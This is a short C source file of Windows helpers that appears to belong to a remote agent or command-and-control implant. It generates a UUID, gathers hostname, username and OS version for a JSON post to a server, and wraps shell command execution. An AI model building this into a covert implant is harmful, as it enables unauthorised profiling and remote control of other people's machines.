#include <rpc.h>
#include <Lmcons.h>
#include "utils.h"
#include "commands.h"

#pragma comment(lib, "Rpcrt4.lib")      // for GenerateUUID()
#pragma comment(lib, "advapi32.lib")    // for GetSystemInfo()

// Generate UUID
void GenerateUUID(char *uuidStr, size_t maxLen) {
    UUID uuid;
    RPC_CSTR szUuid = NULL;
    if (UuidCreate(&uuid) == RPC_S_OK && UuidToStringA(&uuid, &szUuid) == RPC_S_OK) {
        snprintf(uuidStr, maxLen, "%s", szUuid);
        RpcStringFreeA(&szUuid);
    } else {
        snprintf(uuidStr, maxLen, "uuid_error");
    }
}

// Get system info for JSON POST to server
void GetSystemInfoForServer(char *jsonOut, size_t len) {
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD hostlen = sizeof(hostname);
    GetComputerNameA(hostname, &hostlen);

    char username[UNLEN + 1] = {0};
    DWORD userlen = sizeof(username);
    GetUserNameA(username, &userlen);

    OSVERSIONINFOEXA osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionExA((OSVERSIONINFOA*)&osvi);

    snprintf(jsonOut, len,
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"Windows %d.%d Build %d\"}",
        hostname, username, osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
}

void ExecuteCommandWrapper(const char *cmd) {
    ExecuteWindowsShellCommand(cmd);
}
